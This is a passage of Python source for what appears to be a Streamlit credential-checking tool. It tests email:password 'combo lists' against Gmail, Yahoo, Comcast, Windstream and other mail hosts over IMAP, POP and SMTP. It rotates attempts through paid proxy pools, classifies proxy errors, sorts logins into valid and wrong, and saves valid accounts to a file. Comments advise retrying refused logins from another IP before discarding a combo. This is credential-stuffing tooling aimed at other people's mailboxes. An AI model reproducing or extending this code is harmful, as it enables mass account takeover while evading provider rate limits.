BUCKET_SNAPSHOT_TAIL = 250
# Buckets get their own, slower clock than the log stream.
BUCKET_MIN_INTERVAL = 0.6
LOG_CAP_DEBUG = 3000
LOG_CAP_QUIET = 1200
REPORT_ENTRIES_MAX = 3000
# v13.70 MEM-1: how many rows the live report table holds at once. The full set
# is still exported; this is only what is serialised per second.
_DF_TAIL_LIVE = 250
# FIX P1-3 / P1-4: the two per-rerun and per-account hogs get their own clocks.
# FIX SPEED-10: 30s was far too eager for build_diagnostics_text(), which reads
# proxies.txt, walks every proxy_meta row, resolves the egress geo and calls
# getfqdn() - inside a COLLAPSED expander nobody is looking at. 5 minutes.
DIAG_CACHE_TTL = 300.0
REPORT_DF_MIN_INTERVAL = 1.0
# Checkpoint clock. The 100-account counter alone meant a 47-account run never
# reached a checkpoint before a teardown: the record stayed at 0/N, the heartbeat
# went stale and unfinished_live.json was never written, so Resume was empty and
# the stop had no reason. 5s keeps counts, remaining and the reason real.
CHECKPOINT_SECONDS = 5.0
# FIX SURVIVE-2 (v13.67): THE 5s CHECKPOINT DID THREE THINGS OF WILDLY DIFFERENT
# COST - one small heartbeat JSON, a rebuild of the entire remaining queue (one
# str.split() per queued account, 120,056 of them on a real list) and a ~5 MB
# JSON write of that queue - twelve times a minute, on the script thread, for a
# file only the stop path ever reads. The heartbeat stays on
# CHECKPOINT_SECONDS; the queue rebuild and its write get this clock instead.
HEAVY_CHECKPOINT_SECONDS = 30.0
# FIX SPEED-4: the checkpoint also rewrote clean_valid_accounts.txt IN FULL - a
# read of every existing line plus a rewrite - every 5 seconds, on the script
# thread, whether or not anything new had been found. It gets its own slower
# clock, and it now hangs off the heavy checkpoint above.
CLEAN_SYNC_SECONDS = 30.0
# Consecutive transport-ish verdicts before the connection is called down.
NET_STREAK_TRIP = 8
# @@END 014 UI_RENDER_CONSTANTS

# @@BLOCK 015 MAIL_SPOT_CONSTANTS deps=-
MAIL_SPOT_CHECK_DEFAULT = True
MAIL_SPOT_NODES = 3
MAIL_SPOT_TIMEOUT = 6.0
MAIL_SPOT_FALLBACK = ("imap.gmail.com", 993)
# @@END 015 MAIL_SPOT_CONSTANTS

# @@BLOCK 016 PROXY_407_CONTRACT deps=-
# FIX P2-1: every 407ing proxy attempt is a request that cannot succeed, and a
# same-node retry costs a whole attempt.  3 strikes per rung let a single rung
# spend ~4 x 28s before the storm breaker armed.  2 is the working number.
PROXY_407_QUARANTINE = 3
PROXY_407_FORCE_DIRECT = 2
PROXY_407_BACKOFF = 0.8
PROXY_407_COOLDOWN = 90.0
# A same-node 407 retry only makes sense if a REAL attempt still fits.
PROXY_407_RETRY_WINDOW_FACTOR = 1.6
# v13.64: A 402 IS A PLAN STATE, NOT A NINETY-SECOND BLIP. Parking it for the 407
# cooldown put every spent node back in rotation ninety seconds after the probe
# that found it, so a pool silently degraded to half spent nodes mid-run. A 402
# node is parked for ten minutes instead, and block 069 tiers it BELOW a node
# that has actually opened a tunnel, so it is only drawn when nothing better is
# left.
PROXY_PLAN_PARK = 600.0
# @@END 016 PROXY_407_CONTRACT

# @@BLOCK 017 POOL_FILTER_CONSTANTS deps=-
MAX_ROTATIONS_DEFAULT = 2
CHECK_PASS2_DEFAULT = False
DEDUPE_PROXIES_DEFAULT = True
PROBE_STRICT_DEFAULT = True
# FIX SCORE-1: compute_real_score() subtracts 5 per fail on top of a decaying
# base, so 0-success/4-fail lands on 8 - a fresh node was being filtered out of
# the pool after four bad attempts. 5 matches the "< 5" test the Clean Dead /
# Low-Score button already uses.
MIN_PROXY_SCORE_DEFAULT = 5
BLACKLIST_CF_DEFAULT = 15
CIRCUIT_BREAKER_SECONDS = 30.0
# v13.58: there is NO per-IP line cap any more. The provider meters SUB-USERS and
# you pay per API key, so every distinct key deserves its own line in the pool and
# its own row on screen. The per-IP gate still caps real CONCURRENCY, so the extra
# lines widen CHOICE without adding load. The collapse rule lives in block 074.
# @@END 017 POOL_FILTER_CONSTANTS

# @@BLOCK 018 PROBE_TARGET_TABLES deps=-
PROBE_TARGET_AUTO = "auto (from combo list)"
PROBE_TARGET_DEFAULT = "443 (HTTPS)"
PROBE_TARGET_OPTIONS = [
    PROBE_TARGET_AUTO,
    "993 (IMAP)",
    "443 (HTTPS)",
    "windstream 993",
    "windstream 995",
    "both (either)",
]
PROBE_TARGET_PORTS = {
    PROBE_TARGET_AUTO: [("imap.gmail.com", 993, "auto")],
    "993 (IMAP)": [("imap.gmail.com", 993, "993")],
    "443 (HTTPS)": [("api.ipify.org", 443, "443")],
    "windstream 993": [("imap.windstream.net", 993, "ws-imap993")],
    "windstream 995": [("pop.windstream.net", 995, "ws-pop995")],
    "both (either)": [("imap.gmail.com", 993, "993"), ("api.ipify.org", 443, "443")],
}

# A 407 on a MAIL destination is ambiguous: it is the same answer a dead
# credential, a per-sub-user concurrency cap and a plan-state problem all give.
# The only way to tell them apart without guessing is to re-dial a WEB
# destination with the same credential, so this list exists purely as that
# control. It is spent only AFTER a 407, never on a healthy node.
PROBE_CONTROL_TARGETS = [("api.ipify.org", 443, "443")]

# Destination ports a shared provider may refuse outright, independent of the
# credential. Webshare documents 25, 110, 465 and 587 as permanently blocked on
# every plan, so those rungs can never succeed through a Webshare node and must
# not be charged to the node when they come back 403.
PROVIDER_BLOCKED_PORTS = (25, 110, 465, 587)
# @@END 018 PROBE_TARGET_TABLES

# @@BLOCK 019 SETTING_DEFAULTS deps=-
SETTING_DEFAULTS = {
    # v13.42: the Display Fit pair. Without these, ♻️ Reset Defaults left the
    # font size and content scale at whatever the user last dragged, and they
    # were the only sidebar widgets with no reset target.
    "ui_font_size": 16,
    "ui_content_scale": 100,
    "ui_mode": "Normal Mode",
    "ui_protocols": list(PROTOCOL_SELECTION_DEFAULT),
    "ui_workers": WORKERS_NORMAL,
    "ui_deadline": int(DEADLINE_NORMAL),
    "ui_timeout": ATTEMPT_TIMEOUT_NORMAL,
    "ui_max_acc": 5000,
    "ui_blacklist_cf": BLACKLIST_CF_DEFAULT,
    "ui_dynamic_scaling": True,
    "ui_max_hosts": 3,
    "ui_alt_user": True,
    "ui_confirm_wrong": True,
    "ui_smtp_precheck": False,
    "ui_min_proxy_score": MIN_PROXY_SCORE_DEFAULT,
    "ui_probe_precheck_timeout": PROXY_PRECHECK_TIMEOUT_DEFAULT,
    "ui_probe_timeout": int(PROBE_TIMEOUT_DEFAULT),
    "ui_probe_target": PROBE_TARGET_DEFAULT,
    "ui_probe_strict": PROBE_STRICT_DEFAULT,
    "ui_probe_maxtargets": PROBE_MAX_TARGETS_DEFAULT,
    "ui_probe_scheme2": PROBE_SECOND_SCHEME_DEFAULT,
    "ui_prober_idle": PROBER_IDLE_ENABLED_DEFAULT,
    "ui_probe_sample": 0,
    "ui_mail_spot": MAIL_SPOT_CHECK_DEFAULT,
    "ui_dedupe": DEDUPE_PROXIES_DEFAULT,
    "ui_allow_blacklist": False,
    "ui_quarantine": True,
    "ui_host_conc": HOST_CONCURRENCY_DEFAULT,
    "ui_ip_conc": PROXY_IP_CONCURRENCY_DEFAULT,
    "ui_subuser_conc": PROXY_SUBUSER_CONCURRENCY_DEFAULT,
    "ui_proxy_conc": PROXY_CONCURRENCY_DEFAULT,
    "ui_direct_first": True,
    "ui_same_host_retries": SAME_HOST_RETRIES_DEFAULT,
    "ui_max_rot": MAX_ROTATIONS_DEFAULT,
    "ui_pass2": CHECK_PASS2_DEFAULT,
    "ui_random_rot": True,
    "ui_geo_call": False,
    "ui_conn_hint": "Auto",
    "ui_starttls": True,
    "ui_proxy_mode": "fallback",
    "chk_use_proxy": True,
    "chk_retry_cf": True,
    "chk_self_signed": True,
    "chk_proxy_test_flight": True,
    "chk_skip_app": False,
    "chk_debug_mode": True,
    # v13.61: these two text inputs carried no key at all, so they were the only
    # settings that could be neither remembered nor reset. Keys and reset
    # targets now.
    "bb_whitelist": "",
    "bb_blacklist": "",
}


def _seed_widget(key, lo=None, hi=None, choices=None, dflt=None):
    """Put a legal value on `key` and return it, so the widget needs key= ONLY.

    A keyed widget that ALSO receives value= / index= / a positional default
    raises "The widget with key 'x' was created with a default value but also had
    its value set via the Session State API" on every rerun once block 045 has
    seeded that key from this user's settings.json - which is exactly what the
    deployed log shows for 'ui_protocols'. Seeding here and passing only key= is
    the shape block 046 already uses for its three sliders.

    Every value is clamped to the widget's own range or option list, so a value
    saved under an older, wider widget can never make Streamlit refuse to draw.
    """
    base = SETTING_DEFAULTS.get(key) if dflt is None else dflt
    cur = str_lit.session_state.get(key)
    if isinstance(base, bool):
        val = cur if isinstance(cur, bool) else bool(base)
    elif isinstance(base, list):
        ok = isinstance(cur, list) and all(c in (choices or ()) for c in cur)
        val = list(cur) if ok else list(base)
    elif isinstance(base, int):
        try:
            cur = int(cur)
        except Exception:
            cur = int(base)
        if lo is not None:
            cur = max(int(lo), cur)
        if hi is not None:
            cur = min(int(hi), cur)
        val = cur
    elif choices:
        val = cur if cur in choices else (base if base in choices else choices[0])
    else:
        val = cur if cur is not None else base
    str_lit.session_state[key] = val
    return val
# @@END 019 SETTING_DEFAULTS

# @@BLOCK 020 DEFAULT_CFG deps=019
def default_cfg() -> dict:
    """The config dict produced when EVERY settings widget sits on its default."""
    return {
        "MODE_NAME": "Normal",
        "PROTOCOLS": list(PROTOCOL_SELECTION_DEFAULT),
        "MAX_WORKERS_START": WORKERS_NORMAL,
        "MAX_WORKERS_MAX": max(WORKERS_NORMAL * 2, 50),
        "TIMEOUT": ATTEMPT_TIMEOUT_NORMAL,
        "ACCOUNT_DEADLINE": int(DEADLINE_NORMAL),
        "MAX_ACCOUNTS": 5000,
        "BLACKLIST_CF": BLACKLIST_CF_DEFAULT,
        "PROXY_MODE": "fallback",
        "RETRY_CONNECTION_FAILED": 1,
        "ALLOW_SELF_SIGNED": True,
        # TLS_STRICT stays False so the reset target matches ALLOW_SELF_SIGNED=True.
        # build_cfg() sets TLS_STRICT = not self_signed.
        "TLS_STRICT": False,
        "TRY_STARTTLS": True,
        "TRY_ALT_USERNAME": True,
        "CONFIRM_WRONG_ACROSS_HOSTS": True,
        "MAX_HOSTS_PER_DOMAIN": 3,
        "PROXY_TEST_FLIGHT": True,
        "SKIP_STRICT_APP_PROVIDERS": False,
        "DEBUG": True,
        "MIN_PROXY_SCORE": MIN_PROXY_SCORE_DEFAULT,
        "PROXY_PRECHECK_TIMEOUT": PROXY_PRECHECK_TIMEOUT_DEFAULT,
        "PROBE_TIMEOUT": int(PROBE_TIMEOUT_DEFAULT),
        "PROBE_TARGET": PROBE_TARGET_DEFAULT,
        "PROBE_STRICT": PROBE_STRICT_DEFAULT,
        "PROBE_MAX_TARGETS": PROBE_MAX_TARGETS_DEFAULT,
        "PROBE_SECOND_SCHEME": PROBE_SECOND_SCHEME_DEFAULT,
        "PROBER_IDLE_ENABLED": PROBER_IDLE_ENABLED_DEFAULT,
        "PROBE_SAMPLE_MAX": 0,
        "MAIL_SPOT_CHECK": MAIL_SPOT_CHECK_DEFAULT,
        "DEDUPE_PROXIES": DEDUPE_PROXIES_DEFAULT,
        "ALLOW_BLACKLIST_IPS": False,
        "QUARANTINE_407": True,
        "HOST_CONCURRENCY": HOST_CONCURRENCY_DEFAULT,
        "PROXY_IP_CONCURRENCY": PROXY_IP_CONCURRENCY_DEFAULT,
        "PROXY_SUBUSER_CONCURRENCY": PROXY_SUBUSER_CONCURRENCY_DEFAULT,
        "PROXY_CONCURRENCY": PROXY_CONCURRENCY_DEFAULT,
        "DIRECT_FIRST": True,
        "SAME_HOST_RETRIES": SAME_HOST_RETRIES_DEFAULT,
        "MAX_ROTATIONS": MAX_ROTATIONS_DEFAULT,
        "CHECK_PASS2": CHECK_PASS2_DEFAULT,
        "POOL_MODE": "all",
        "SELECTED_COUNTRIES": [],
        "SELECTED_MIX_COUNTRIES": [],
        "DYNAMIC_WORKER_SCALING": True,
        "CUSTOM_WHITELIST": [],
        "CUSTOM_BLACKLIST": [],
        # FIX ISO-6 (v13.59): THE POOL FILES WERE SHARED. proxies.txt,
        # proxies_all.txt, proxy_meta.json, proxy_key_map.json and
        # domain_cache.json lived in the working directory, so every user on a
        # deployment read, overwrote and rescued every other user's pool. They
        # are per-user files now, named by the unlocked passkey prefix exactly
        # like every result file.
        "PROXY_FILE": user_file("proxies.txt"),
        "PROXY_ALL_FILE": user_file("proxies_all.txt"),
        "PROXY_KEYMAP_FILE": user_file("proxy_key_map.json"),
        "RESULTS_DIR": user_file("mail_results"),
        "CACHE_FILE": user_file("domain_cache.json"),
        "PROXY_META_FILE": user_file("proxy_meta.json"),
        "MAX_PROXY_TRIES": 2,
        "PROXY_CONNECT_TIMEOUT": 8.0,
        "FAST_MODE": False,
        "FAILURE_COOLDOWN": FAILURE_COOLDOWN_DEFAULT,
        "RANDOM_ROTATION": True,
        "GEO_CALL": False,
        "CONNECTION_HINT": "Auto",
        "SMTP_CHECK": False,
    }
# @@END 020 DEFAULT_CFG

# @@BLOCK 021 DOMAIN_TABLES deps=-
WEB_ONLY_HOSTS = {
    "secure.windstream.net",
    "webmail.windstream.net",
    "secure.suddenlink.net",
    "webmail.suddenlink.net",
    "secure.optimum.net",
}

DOMAIN_COUNTRY_HINTS = {
    "windstream.net": "United States",
    "kinetic.net": "United States",
    "mediacombb.net": "United States",
    "mchsi.com": "United States",
    "comcast.net": "United States",
    "cox.net": "United States",
    "charter.net": "United States",
    "spectrum.net": "United States",
    "suddenlink.net": "United States",
    "optimum.net": "United States",
    "optonline.net": "United States",
    "att.net": "United States",
    "sbcglobal.net": "United States",
    "bellsouth.net": "United States",
    "verizon.net": "United States",
    "frontier.com": "United States",
    "centurylink.net": "United States",
    "embarqmail.com": "United States",
    "earthlink.net": "United States",
    "breezeline.net": "United States",
    "armstrong.net": "United States",
    "gmail.com": "United States",
    "outlook.com": "United States",
    "yahoo.com": "United States",
}

APP_PASSWORD_DOMAINS = {
    "gmail.com", "googlemail.com",
    "yahoo.com", "ymail.com", "rocketmail.com", "yahoo.co.uk", "yahoo.fr",
    "yahoo.de", "yahoo.it", "yahoo.es", "yahoo.com.br",
    "aol.com",
}
_APP_PW_16 = re.compile(r"^[a-z]{16}$")
_APP_PW_SPACED = re.compile(r"^(?:[a-z]{4}\s){3}[a-z]{4}$")
# @@END 021 DOMAIN_TABLES

# @@BLOCK 022 EXCEPTION_TYPES deps=-
class ProxyAuthError(ConnectionError):
    """The PROXY rejected our CREDENTIALS (407). The mail host is still untested."""


class ProxyTransportError(ConnectionError):
    """The tunnel broke at the SOCKET level. Not a 407, not a mail verdict."""


class ProxyPortBlocked(ProxyTransportError):
    """The proxy reached the target and REFUSED THE DESTINATION PORT (403).

    A Webshare node answers 403 client_connect_forbidden_port on 25 / 110 / 465 /
    587 by policy. The node is fine and the credential is fine, so this must NOT
    rotate the proxy or count against it - it only means "advance one rung".
    Subclasses ProxyTransportError so every existing handler still catches it.
    """


class ProxyPlanError(ProxyTransportError):
    """The proxy is ALIVE and the credential was ACCEPTED, but the provider is
    refusing SERVICE (402 Payment Required / 429 / 503).

    Webshare answers 402 when the plan's bandwidth is spent. Nothing about the
    node and nothing about the password is wrong, so this must not strike, not
    quarantine, not arm the breaker and not decay the score - and above all it
    must not be reported as a 407. Subclasses ProxyTransportError so existing
    handlers still catch it, but it is always tested first.
    """


class SmtpAuthError(ConnectionError):
    """A CLEAN 535 from submission. A real credential answer. CONFIRM-ONLY."""


class SmtpSoftError(ConnectionError):
    """530 Authentication Required, relay restriction, 504, 4xx greylist."""


class SieveAuthError(ConnectionError):
    """A clean NO from ManageSieve. A real credential answer. CONFIRM-ONLY."""


class SieveSoftError(ConnectionError):
    """ManageSieve said something inconclusive."""


class MsVerdict(Exception):
    """A DEFINITE Microsoft token verdict, carried out of verify_and_connect."""

    def __init__(self, verdict, detail=""):
        super().__init__(detail or verdict)
        self.verdict = verdict
        self.detail = detail or verdict
# @@END 022 EXCEPTION_TYPES

# @@BLOCK 023 SMALL_PREDICATES deps=-
# Decisiveness for note_verdict(), HIGH WINS - and it must be identical under
# status.py AND under the inline fallback, because status.PRIORITY is high-wins
# while the fallback's ST_PRIORITY is low-wins.  note_verdict() compared with
# `<`, so under status.py a later WRONG could never overwrite an earlier
# LOGIN_DROPPED, and a bare UNKNOWN always won.
#
# v13.51: CONNECTION_FAILED has a rank now.  It used to fall through
# _VERDICT_RANK.get(..., 0), so a real transport answer ranked BELOW a bare
# UNKNOWN and could never be the retained verdict - which is why every
# transport failure ended on the generic tail text instead of its own.
_VERDICT_RANK = {
    WRONG: 90,
    VALID: 80,
    APP: 70,
    RBL: 60,
    LOGIN_DROPPED: 50,
    SMTP_FAILED: 46,
    DNS_FAILED: 45,
    # v13.53: RETRY had no rank, so it fell through .get(..., 0) and ranked
    # below a bare UNKNOWN - and block 102 calls note_verdict() with RETRY
    # before its own branch. A rate-limit answer could never be retained.
    RETRY: 42,
    CONNECTION_FAILED: 40,
    UNKNOWN: 10,
}

# v13.51: the three ways a server says "no TLS here".  A rung that is refused
# STARTTLS never issues a LOGIN, so it must not be reported as a dropped LOGIN
# and must not spend an in-place retry - the answer will be identical.
_TLS_REFUSED_TOKENS = (
    "tls not supported by server",
    "stls not supported",
    "starttls not supported",
    "tls not supported",
    "not supported by server",
)


def _is_tls_refused(msg) -> bool:
    """True when the server refused the TLS upgrade itself (no LOGIN was sent)."""
    m = (msg or "").lower()
    if not m:
        return False
    return any(tok in m for tok in _TLS_REFUSED_TOKENS)


def _is_proxy_auth_fail(msg) -> bool:
    """True when the PROXY ITSELF rejected us, as opposed to a transport failure."""
    m = (msg or "").lower()
    return ("407" in m
            or "proxy authentication required" in m
            or "socks5 authentication failed" in m
            or "socks authentication failed" in m)


def _is_proxy_plan_error(msg) -> bool:
    """True when the provider is refusing SERVICE, not the credential or the node.

    402 Payment Required is Webshare's bandwidth/plan answer; 429 and 503 are the
    same family. It has to be tested BEFORE the auth test in callers, because a
    SOCKS5 fallback onto an HTTP-only port always answers "authentication failed"
    and would otherwise bury the real 402 under a fake 407.
    """
    m = (msg or "").lower()
    if _is_proxy_auth_fail(m) or _is_proxy_port_block(m):
        return False
    return ("402" in m or "payment required" in m
            or "429" in m or "too many requests" in m
            or "503" in m or "service unavailable" in m)


def _is_proxy_port_block(msg) -> bool:
    """True when the proxy REFUSED THE DESTINATION PORT (403), not the credential.

    PySocks renders the proxy's status line into the exception text, so the code
    is the reliable signal here. 403 is also what client_connect_forbidden_host
    and client_connect_invalid_ip return - all three are destination/plan
    problems, never a dead node, so one test covers them.
    """
    m = (msg or "").lower()
    if "407" in m or _is_proxy_auth_fail(m):
        return False
    return ("403" in m or "forbidden" in m or "blocked by" in m
            or "not allowed" in m)


def _timeout_kind(err) -> str:
    """'connect' | 'read' | ''."""
    low = str(err).lower()
    if "read operation timed out" in low:
        return "read"
    if "timed out" in low or "timeout" in low:
        return "connect"
    return ""


def _looks_like_app_password(pw) -> bool:
    p = (pw or "").strip()
    if not p:
        return False
    return bool(_APP_PW_16.match(p) or _APP_PW_SPACED.match(p))


def _wrong_detail_note(domain, password) -> str:
    """Honest labelling for the providers where WRONG is ambiguous."""
    d = (domain or "").lower().strip()
    if d in APP_PASSWORD_DOMAINS and not _looks_like_app_password(password):
        return " (may be correct - provider needs an APP PASSWORD for IMAP/POP/SMTP)"
    return ""


def _login_dropped_detail() -> str:
    """The honest readout for a server that answers then hangs up."""
    return ("server accepted LOGIN then closed the socket (* BYE) on every attempt "
            "- usually a rejected password or an app-password requirement; retry from "
            "a different IP or with an app password before discarding the combo")
# @@END 023 SMALL_PREDICATES

# @@BLOCK 024 ENGINE_STATE deps=-
@str_lit.cache_resource(show_spinner=False)
def _engine_state():
    return {
        # locks that are genuinely process-wide (they guard process-wide tables)
        "cache_lock": threading.Lock(),
        "proxy_lock": threading.Lock(),
        # v13.59: process-wide guards. One lock is enough for the pair and keeps
        # the module alias stable across reruns.
        "alive_pool_lock": threading.Lock(),
        "rr_lock": threading.Lock(),
        "rr_index": 0,
        "rr_last": None,
        # v13.51: RLock, not Lock.  _write_clean_valid() takes this lock itself,
        # and block 107 already holds it while writing the result files - so any
        # call site that nests the two deadlocked the SCRIPT THREAD for ever and
        # the page never returned.
        "file_write_lock": threading.RLock(),
        "session_state_lock": threading.Lock(),
        "host_dns_lock": threading.Lock(),
        "geo_lock": threading.Lock(),
        "public_ip_lock": threading.Lock(),
        "direct_geo_lock": threading.Lock(),
        "smtp_lock": threading.Lock(),
        "target_reach_lock": threading.Lock(),
        "helo_lock": threading.Lock(),
        # per-SESSION tables, keyed by the unlocked scope. See _user_state().
        "per_user": {},
        "per_user_lock": threading.Lock(),
        # concurrency gates (process-wide, but every KEY is scope-prefixed)
        "host_gate_lock": threading.Lock(),
        "host_gates": {},
        "ip_gates": {},
        "subuser_gates": {},
        "proxy_gate": None,
        # genuinely shared caches - the data describes the world, not a user
        "host_dns_cache": {},
        "meta": {},
        "geo_cache": {},
        "public_ip": {"ip": "", "ts": 0.0},
        "direct_geo": {"ts": 0.0, "ip": "", "country": "Unknown",
                       "region": "Unknown", "vpn": "Auto"},
        "direct_isp": {"ts": 0.0, "isp": ""},
        "smtp_domain_cache": {},
        "target_reach": {"ts": 0.0, "rows": []},
        "helo_name": {"name": "", "ts": 0.0},
        "geo_fail": {},
        "geo_last_call": {"ts": 0.0},
        # process bookkeeping
        "run_active": False,
        "runs_active": 0,
        "process_start": time.time(),
    }


STATE = _engine_state()

# FIX ISO-6 (v13.59): EVERYTHING THAT DESCRIBES A USER'S OWN POOL LIVES HERE.
# These used to be single process tables keyed only by the proxy line, so two
# users on one deployment shared one alive_pool, one quarantine set, one strike
# counter, one probe log and one probe lock - and one user's Apply Settings or
# quarantine lifted the other's nodes. Each scope now gets its own dict and
# every module alias below is bound to the CURRENT scope's dict on each rerun.
# Worker threads keep the binding from the run that spawned them, so a rerun in
# another tab cannot retarget them.
#
# v13.65: THE TEMPLATE WAS A SHALLOW COPY. `dict(_DEFAULT_USER_STATE)` copies the
# mapping but NOT the values, so alive_pool (a list) was the SAME object in every
# scope - one user's probe overwrote the other's armed pool. Every mutable value
# is allocated by _new_user_state() now and alive_pool is per user like the rest.
def _new_user_state() -> dict:
    """A COMPLETE, freshly allocated set of per-user tables."""
    return {
        "alive_pool": [],
        "consecutive_proxy_failures": defaultdict(int),
        "circuit_breaker_until": {},
        "proxy_quarantine": set(),
        "strikes_407": defaultdict(int),
        "proxy_scheme": {},
        "proxy_407_until": {},
        "proxy_meta": {},
        "probe_stats": {},
        "probe_log": [],
        "probe_in_flight": False,
        "probe_owner_lock": threading.Lock(),
        "probe_stats_lock": threading.Lock(),
        "probe_log_lock": threading.Lock(),
        "proxy_quarantine_lock": threading.Lock(),
        "proxy_scheme_lock": threading.Lock(),
        "last_probe_ts": 0.0,
        "probe_runs": 0,
        "bootstrap_done": False,
        "first_probe_kicked": False,
        "probe_targets_override": [],
        "runs_active": 0,
        # v13.64: THE FAST-MODE COOLDOWN WAS SHARED. It was a process dict keyed on
        # the DOMAIN alone, so user A failing a domain put user B's accounts on that
        # same domain into cooldown for 45s - user B's run then reported them SKIP
        # for a reason that happened in someone else's tab. Per user now.
        "failed_domain_cache": {},
    }


# Derived from the factory, so the two can never drift apart.
_USER_STATE_KEYS = tuple(_new_user_state())


def _session_scope() -> str:
    """The session token, read straight from session_state.

    Used before block 040 has defined _gate_scope(), and as its fallback.
    """
    try:
        tok = (str_lit.session_state.get("user_key_hash")
               or str_lit.session_state.get("_anon_hash")
               or "anon")
    except Exception:
        tok = "anon"
    return str(tok) or "anon"


def _user_state(scope=None) -> dict:
    """This session's own tables, HEALED to the current key set.

    v13.65: STATE is a cache_resource, and a cache_resource survives a rerun AND
    a redeploy - Streamlit only invalidates it when this function's own source
    changes, and the v13.64 edit changed _user_state(), not _engine_state(). The
    process therefore kept handing back a per_user dict built by v13.63 code,
    which has no "failed_domain_cache", and block 039 died on
    KeyError: 'failed_domain_cache'. A missing table is now created on read, so a
    key added by any future build can never be absent.
    """
    if scope:
        who = str(scope)
    else:
        try:
            who = _gate_scope()
        except Exception:
            who = _session_scope()
    tbl = STATE.setdefault("per_user", {})
    d = tbl.get(who)
    if d is None:
        with STATE["per_user_lock"]:
            d = tbl.get(who)
            if d is None:
                d = _new_user_state()
                tbl[who] = d
        return d
    if any(k not in d for k in _USER_STATE_KEYS):
        with STATE["per_user_lock"]:
            _fresh = _new_user_state()
            for _k in _USER_STATE_KEYS:
                if _k not in d:
                    d[_k] = _fresh[_k]
    return d


def forget_user_state(scope):
    """Drop a scope's tables entirely. Called on Forget passkey."""
    try:
        STATE.setdefault("per_user", {}).pop(str(scope), None)
    except Exception:
        pass


_US = _user_state()

probe_stats = _US["probe_stats"]
probe_stats_lock = _US["probe_stats_lock"]
probe_log = _US["probe_log"]
probe_log_lock = _US["probe_log_lock"]
_PROBE_OWNER_LOCK = _US["probe_owner_lock"]

_PROBE_REASON_LABEL = {
    "ok": "pass",
    "auth": "407 auth (node)",
    "auth_dest": "407 auth (dest only)",
    "plan": "402 plan/bandwidth (node alive)",
    "transport": "transport reset",
    "timeout": "timeout",
    "dead": "dead",
    "tcp": "tcp dead",
    "format": "bad format",
    "nosocks": "no PySocks",
    "blocked": "circuit-broken",
}
# @@END 024 ENGINE_STATE

# @@BLOCK 025 PROBE_TELEMETRY deps=024
def log_probe_event(msg):
    if '_rebind_scope' in globals():
        _rebind_scope()
    with probe_log_lock:
        probe_log.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        if len(probe_log) > 600:
            del probe_log[:-600]


def record_probe_result(proxy_str, ok, reason, latency_ms=0, target="",
                        scheme=None, error=""):
    if '_rebind_scope' in globals():
        _rebind_scope()
    if not proxy_str:
        return
    with probe_stats_lock:
        prev = probe_stats.get(proxy_str) or {}
        probe_stats[proxy_str] = {
            "ok": bool(ok),
            "reason": reason or ("ok" if ok else "dead"),
            "ts": time.time(),
            "latency_ms": int(latency_ms or 0),
            "target": target or "",
            "scheme": scheme,
            "error": (error or "")[:300],
            "attempts": int(prev.get("attempts", 0)) + 1,
            "first_seen": prev.get("first_seen") or time.time(),
        }
    _user_state()["last_probe_ts"] = time.time()


def _probe_snapshot():
    """(key, record) pairs, RESTRICTED to lines that are still in this user's file.

    v13.54: NOTHING PRUNES probe_stats while idle. refresh_alive_pool returns at
    its first line when no run is active and idle probing is off, and the prune
    sits far below that - so every entry from an earlier, larger pool survived.
    The sidebar read "16 validated node(s) armed" over a 9-line file, and the
    breakdown counted 122 entries for 9 nodes. Filtering on read fixes the
    display without touching the prune.

    v13.59: probe_stats is per-scope now, so this is the user's own history only.
    """
    if '_rebind_scope' in globals():
        _rebind_scope()
    with probe_stats_lock:
        snap = list(probe_stats.items())
    try:
        live_keys = set(globals().get("all_proxies") or ())
    except Exception:
        live_keys = set()
    if live_keys:
        snap = [(k, v) for k, v in snap if k in live_keys]
    return snap


def probe_summary():
    """(passed, auth, plan, timeout, dead) over the most recent probe of each node.

    FIX 407-SCOPE: `auth_dest` counts as an AUTH answer in this breakdown - it is
    still a 407 - but the node also carries ok=True, so it lands in `passed` at
    the same time. `dead` must therefore exclude it or one node is counted twice.

    FIX PLAN-1: 402 / 429 / 503 is neither an auth answer nor a dead node. The
    proxy is alive and the credential was accepted; the provider is refusing
    service. It gets its own column so `dead` stops absorbing it and the UI can
    say which of the two a zero-success pool actually is.
    """
    vals = [v for _k, v in _probe_snapshot()]
    passed = sum(1 for v in vals if v.get("ok"))
    auth = sum(1 for v in vals if v.get("reason") in ("auth", "auth_dest"))
    plan = sum(1 for v in vals if v.get("reason") == "plan")
    timeout = sum(1 for v in vals if not v.get("ok")
                  and v.get("reason") in ("timeout", "transport"))
    dead = sum(1 for v in vals if not v.get("ok")
               and v.get("reason") not in ("auth", "auth_dest", "plan",
                                           "timeout", "transport"))
    return passed, auth, plan, timeout, dead


def probe_reason_histogram():
    hist = defaultdict(int)
    for _k, v in _probe_snapshot():
        hist[v.get("reason") or "?"] += 1
    return dict(sorted(hist.items(), key=lambda kv: -kv[1]))


def clear_tunnel_cache():
    """Clearing the probe stats is what a re-probe actually needs."""
    if '_rebind_scope' in globals():
        _rebind_scope()
    with probe_stats_lock:
        probe_stats.clear()
# @@END 025 PROBE_TELEMETRY

# @@BLOCK 026 RUNTIME_HELPERS deps=024
# FIX CFG-SCOPE (v13.57): THE CONFIG A WORKER READ WAS NOT THE CONFIG ITS RUN STARTED
# WITH. STATE["cfg"] is PROCESS state and block 055 reassigns it on every rerun of
# EVERY session, so the moment a second user loaded the page - or the first user
# clicked anything - the workers of the live run started reading someone else's
# settings mid-account: another user's protocols, another user's timeouts, another
# user's concurrency ceilings. Block 106's tail trim then wrote the capped deadline
# into a dict the next rerun replaced again.
#
# The fix is a per-TASK snapshot: block 105 seeds one on the worker thread before
# any attempt, live_cfg() reads it first, and the process value is only the
# fallback for the script thread. The core's own direct CFG reads are deliberately
# left on the live dict so the tail cap still bites.
_CFG_TLS = threading.local()


def _cfg_snapshot():
    """A private COPY of the current config, safe to hand to a worker."""
    try:
        base = STATE.get("cfg") or globals().get("CFG") or {}
    except Exception:
        base = {}
    out = {}
    try:
        for k, v in dict(base).items():
            out[k] = list(v) if isinstance(v, list) else v
    except Exception:
        try:
            out = dict(base)
        except Exception:
            out = {}
    return out


def seed_task_cfg(snap=None):
    """Pin the config for THIS worker thread. One call per account."""
    try:
        _CFG_TLS.cfg = snap if isinstance(snap, dict) else _cfg_snapshot()
        return _CFG_TLS.cfg
    except Exception:
        return {}


def clear_task_cfg():
    try:
        _CFG_TLS.cfg = None
    except Exception:
        pass


def live_cfg():
    """The config THIS thread is working under.

    The task snapshot wins. STATE["cfg"] is only correct on the script thread,
    where the run has not been handed off yet.
    """
    try:
